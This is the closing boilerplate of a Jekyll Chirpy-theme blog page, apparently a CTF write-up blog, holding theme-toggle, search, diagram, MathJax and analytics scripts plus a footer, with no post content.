<https://github.com/utterance/utterances/issues/170#issuecomment-594036347> */ if (event.origin === origin) { /* page initial */ theme = initTheme; } else if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); } else { return; } const message = { type: "set-theme", theme: theme }; const utterances = document.querySelector(iframe).contentWindow; utterances.postMessage(message, origin); }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> Â© 2022 <a href="https://github.com/G0RiyA">G0RiyA</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/dreamhack/">Dreamhack</a> <a class="post-tag" href="/tags/gon/">GoN</a> <a class="post-tag" href="/tags/writeup/">writeup</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG â€º <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-MNBEPZZWGS"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-MNBEPZZWGS'); }); </script>
